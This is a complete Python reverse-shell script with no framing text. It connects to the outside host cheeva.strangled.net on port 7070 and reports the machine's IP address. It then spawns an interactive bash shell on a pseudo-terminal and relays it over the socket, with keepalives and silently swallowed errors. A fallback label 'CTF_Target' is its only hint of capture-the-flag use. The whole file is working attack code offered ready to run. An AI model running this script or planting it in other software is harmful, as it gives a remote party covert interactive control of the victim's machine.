import socket, os, pty, select, subprocess

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("cheeva.strangled.net", 7070))
    
 
    try: local_ip = s.getsockname()[0]
    except: local_ip = "CTF_Target"
    s.sendall((str(local_ip) + "\n").encode())
    

    master, slave = os.openpty()
    p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
    os.close(slave)
    
    while p.poll() is None:
        r, _, _ = select.select([s, master], [], [], 5)
        if not r:
            try: s.sendall(b"\x00")
            except: break
            continue
        for fd in r:
            if fd == s:
                d = s.recv(4096)
                if not d: break
                os.write(master, d)
            elif fd == master:
                d = os.read(master, 4096)
                if not d: break
                s.sendall(d)
        else:
            continue
        break
    p.terminate()
except Exception as e:
    pass
